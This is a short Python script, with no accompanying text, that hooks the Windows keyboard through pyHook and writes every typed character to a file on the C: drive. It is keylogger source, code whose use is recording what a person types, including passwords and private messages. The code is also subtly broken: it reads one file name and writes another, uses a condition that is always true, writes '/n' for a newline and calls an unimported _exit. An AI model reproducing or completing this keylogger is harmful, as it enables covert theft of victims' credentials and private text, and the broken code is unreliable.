import win32api
import win32console
import win32gui
import pythoncom
import pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 1)

def OnKeyboardEvent(event):
	if (event.Ascii == 5):
		_exit(1)
	if (event.Ascii != 0 or 8):
		f = open('c:\output.txt', 'r+')
		buffer = f.read()
		f.close()

		f = open('c:\output', 'w')
		keylogs = chr(event.Ascii)
		if (event.Ascii == 13):
			keylogs = '/n'

		buffer += keylogs
		f.write(buffer)
		f.close()



hm = pyHook.HookManager()
hm.keyDown = OnKeyboardEvent

hm.HookKeyboard()

pythoncom.PumpMessages()
